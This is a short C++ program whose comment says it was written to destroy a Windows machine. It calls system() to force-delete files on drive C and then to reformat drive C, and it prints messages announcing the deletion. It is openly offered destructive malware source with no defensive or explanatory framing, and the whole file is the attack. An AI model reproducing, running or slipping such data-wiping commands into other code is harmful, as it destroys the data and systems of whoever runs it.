/* This program is designed by Saroj kumar tharu to destory windows machine */
#include<iostream>
#include<stdlib.h>
using namespace std;

int main(){
	system(" del /f c: *");
	cout<<endl<<"\t\t Sucessfully Delete";
	cout<<endl<<"\t\t Format drive c";
	system("format c: /fs:NTFS");
	cout<<endl<<"\t\t Delete drive c";

	return 0;
}